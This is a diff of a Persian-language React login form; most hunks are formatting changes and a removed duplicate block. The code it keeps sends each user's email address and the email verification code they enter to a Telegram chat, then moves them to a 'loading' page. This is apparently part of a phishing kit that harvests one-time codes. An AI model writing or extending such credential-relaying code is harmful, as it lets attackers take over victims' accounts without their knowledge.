@@ -202,7 +202,7 @@ export const LoginForm = () => {
     if (!mobileNumber) {
       newErrors.mobileNumber = "شماره همراه الزامی است";
     } else if (!validateMobileNumber(mobileNumber)) {
-      newErrors.mobileNumber = "شماره ه��راه معتبر نیست";
+      newErrors.mobileNumber = "شماره همراه معتبر نیست";
     }
 
     if (Object.keys(newErrors).length > 0) {
@@ -453,29 +453,28 @@ export const LoginForm = () => {
       });
 
       if (emailMessageId) {
-        console.log("✅ Message ID found, updating existing message:", emailMessageId);
+        console.log(
+          "✅ Message ID found, updating existing message:",
+          emailMessageId,
+        );
         // Update the existing message with both email and code
         const updatedMessage = `📧 کاربر ایمیل وارد کرد:\n\nایمیل: ${email}\n\n✅ کد تایید ایمیل:\nکد وارد شده: ${emailCode}`;
 
-        const updateResult = await updateCustomMessageInTelegram(emailMessageId, updatedMessage);
+        const updateResult = await updateCustomMessageInTelegram(
+          emailMessageId,
+          updatedMessage,
+        );
         console.log("🔄 Update result:", updateResult);
       } else {
         console.log("❌ No message ID found - این نباید اتفاق بیفتد!");
-        console.error("Critical: Email message ID is missing, cannot update message");
-        setErrors({ emailCode: "خطا در سیستم. لطفا مجدداً ایمیل را وارد کنید." });
+        console.error(
+          "Critical: Email message ID is missing, cannot update message",
+        );
+        setErrors({
+          emailCode: "خطا در سیستم. لطفا مجدداً ایمیل را وارد کنید.",
+        });
         setEmailStep("email");
         return;
-      }
-        console.log("🔄 Update result:", updateResult);
-      } else {
-        console.log(
-          "❌ No message ID found, using fallback (sending new message)",
-        );
-        // Fallback: send new message if message ID is not available
-        const fallbackResult = await sendCustomMessageToTelegram(
-          `✅ کاربر کد تایید ایمیل وارد کرد:\n\nکد وارد شده: ${emailCode}\n\nایمیل: ${email}`,
-        );
-        console.log("📤 Fallback result:", fallbackResult);
       }
 
       // Navigate to loading page after updating Telegram
